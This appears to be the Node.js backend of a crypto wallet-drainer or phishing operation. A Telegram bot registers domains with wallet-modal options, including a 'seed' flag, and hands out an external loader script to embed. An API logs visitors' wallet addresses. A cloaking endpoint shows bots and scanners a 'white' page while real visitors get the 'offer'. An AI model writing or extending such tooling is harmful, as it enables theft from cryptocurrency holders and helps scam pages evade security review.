// exoincs-bot – Telegram bot + REST API for per-domain wallet config
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const { Telegraf } = require('telegraf');

// ------------------------- CONFIG -------------------------
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID || '';
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN) {
    console.error('❌ BOT_TOKEN environment variable not set.');
    process.exit(1);
}

// ------------------------- DATABASE -------------------------
const db = new sqlite3.Database('./exoincs.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS domains (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT UNIQUE,
        exogator_id TEXT,
        modaltheme INTEGER,
        towsteps INTEGER,
        evm INTEGER,
        seed INTEGER,
        auto INTEGER,
        dark INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS visitors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT,
        wallet_address TEXT,
        first_seen DATETIME,
        last_seen DATETIME,
        visits INTEGER DEFAULT 1,
        UNIQUE(domain, wallet_address)
    )`);
});

// ------------------------- EXPRESS API -------------------------
const app = express();
app.use(express.json());

app.get('/config', (req, res) => {
    const domain = req.query.domain;
    if (!domain) return res.status(400).json({ error: 'Missing domain' });
    db.get(
        `SELECT exogator_id, modaltheme, towsteps, evm, seed, auto, dark FROM domains WHERE domain = ?`,
        [domain],
        (err, row) => {
            if (err || !row) return res.status(404).json({ error: 'Domain not registered' });
            res.json(row);
        }
    );
});

app.post('/track', (req, res) => {
    const { domain, wallet_address, action } = req.body;
    if (!domain || !wallet_address) return res.status(400).json({ error: 'Missing domain or wallet_address' });
    const now = new Date().toISOString();
    db.run(
        `INSERT INTO visitors (domain, wallet_address, first_seen, last_seen)
         VALUES (?, ?, ?, ?)
         ON CONFLICT(domain, wallet_address) DO UPDATE SET
            last_seen = excluded.last_seen,
            visits = visits + 1`,
        [domain, wallet_address, now, now],
        (err) => {
            if (err) console.error(err);
            res.json({ ok: true });
        }
    );
});

app.get('/cloak/decision', (req, res) => {
    const { domain, ip, ua } = req.query;
    const uaLower = (ua || '').toLowerCase();
    const isBot = /bot|crawl|spider|scrape|headless|curl|wget|python/i.test(uaLower);
    if (isBot) {
        return res.json({ page: 'white', url: 'https://example.com/white-page.html' });
    }
    return res.json({ page: 'offer' });
});

// ------------------------- TELEGRAM BOT (HTML parse_mode) -------------------------
const bot = new Telegraf(BOT_TOKEN);

bot.start((ctx) => {
    ctx.reply(`🤖 <b>Exoincs Bot</b> – Manage wallet config per domain

Commands:
/register &lt;domain&gt; &lt;exogator_id&gt; &lt;modaltheme&gt; &lt;towsteps&gt; &lt;evm&gt; &lt;seed&gt; &lt;auto&gt; &lt;dark&gt;
/list
/stats &lt;domain&gt;
/help

Example:
<code>/register example.com EXO123 3 1 1 0 0 0</code>

After registration, use this script on your website:
<code>&lt;script src="https://assets.cdn.express/exo-loader.js?domain=example.com"&gt;&lt;/script&gt;</code>

The script will automatically fetch your wallet settings.`, { parse_mode: 'HTML' });
});

bot.command('register', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 9) {
        return ctx.reply('Usage: /register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark>');
    }
    const [domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark] = args.slice(1);
    if (!domain.includes('.')) return ctx.reply('Invalid domain name');
    const modal = parseInt(modaltheme);
    const tow = parseInt(towsteps);
    const e = parseInt(evm);
    const s = parseInt(seed);
    const a = parseInt(auto);
    const d = parseInt(dark);
    if (isNaN(modal) || modal < 1 || modal > 4) return ctx.reply('modaltheme must be 1,2,3,4');
    if ([tow, e, s, a, d].some(v => v !== 0 && v !== 1)) {
        return ctx.reply('towsteps, evm, seed, auto, dark must be 0 or 1');
    }
    db.run(
        `INSERT INTO domains (domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [domain, exogator_id, modal, tow, e, s, a, d],
        (err) => {
            if (err) return ctx.reply(`❌ Domain <code>${domain}</code> already registered or database error.`, { parse_mode: 'HTML' });
            const scriptUrl = `https://assets.cdn.express/exo-loader.js?domain=${encodeURIComponent(domain)}`;
            ctx.reply(`✅ Domain <b>${domain}</b> registered successfully!

📜 <b>Script URL</b>:
<code>${scriptUrl}</code>

Add this to your website &lt;body&gt;:
<code>&lt;script src="${scriptUrl}"&gt;&lt;/script&gt;</code>

Your config: modaltheme=${modal}, towsteps=${tow}, evm=${e}, seed=${s}, auto=${a}, dark=${d}`, { parse_mode: 'HTML' });
        }
    );
});

bot.command('list', (ctx) => {
    if (ADMIN_ID && ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Admin only.');
    db.all(`SELECT domain, exogator_id, created_at FROM domains ORDER BY created_at DESC`, (err, rows) => {
        if (err || !rows.length) return ctx.reply('No domains registered.');
        let msg = '<b>Registered Domains:</b>\n';
        rows.forEach(r => {
            msg += `🌐 ${r.domain} – ${r.exogator_id} (${r.created_at})\n`;
        });
        ctx.reply(msg, { parse_mode: 'HTML' });
    });
});

bot.command('stats', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /stats <domain>');
    const domain = args[1];
    db.get(`SELECT COUNT(*) as total, SUM(visits) as visits FROM visitors WHERE domain = ?`, [domain], (err, row) => {
        if (err || !row || row.total === 0) return ctx.reply(`No data for domain <code>${domain}</code>`, { parse_mode: 'HTML' });
        ctx.reply(`📊 <b>Stats for ${domain}</b>\nUnique wallets: ${row.total}\nTotal visits: ${row.visits || 0}`, { parse_mode: 'HTML' });
    });
});

bot.command('help', (ctx) => {
    ctx.reply(`Commands:
/register &lt;domain&gt; &lt;exogator_id&gt; &lt;modaltheme&gt; &lt;towsteps&gt; &lt;evm&gt; &lt;seed&gt; &lt;auto&gt; &lt;dark&gt;
/list – list all domains (admin)
/stats &lt;domain&gt; – show visitor stats
/start – show this menu
/help – this message`, { parse_mode: 'HTML' });
});

bot.launch();
console.log('🤖 exoincs-bot started');

app.listen(PORT, () => console.log(`🌐 API server listening on port ${PORT}`));
